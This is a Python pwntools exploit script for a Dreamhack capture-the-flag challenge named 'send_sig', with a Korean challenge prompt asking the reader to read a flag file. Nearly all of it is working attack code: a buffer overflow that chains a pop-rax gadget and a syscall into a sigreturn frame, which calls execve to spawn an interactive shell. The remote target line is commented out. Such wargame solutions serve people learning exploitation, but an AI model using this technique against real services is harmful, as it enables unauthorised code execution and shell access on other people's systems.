'''
서버로 signal을 보낼 수 있는 프로그램입니다!
프로그램의 취약점을 찾고, 익스플로잇해 flag를 읽어보세요.
flag는 home/send_sig/flag.txt에 있습니다.
'''

from pwn import *

p = process('./send_sig')
#p = remote('host3.dreamhack.games', 13456)

shell = 0x402000
pop_rax_ret = 0x4010ae
#ret = 0x4010a5
syscall = 0x4010b0

sigFrame = SigreturnFrame(arch='amd64')
sigFrame.rax = 0x3b
sigFrame.rdi = shell
sigFrame.rsi = 0x0
sigFrame.rdx = 0x0
sigFrame.rip = syscall

p.recvuntil("Signal:")
payload = b"a" * 0x10
payload += p64(pop_rax_ret)
payload += p64(0xf)
payload += p64(syscall)
payload += bytes(sigFrame)
    
print(payload)

p.send(payload)
p.interactive()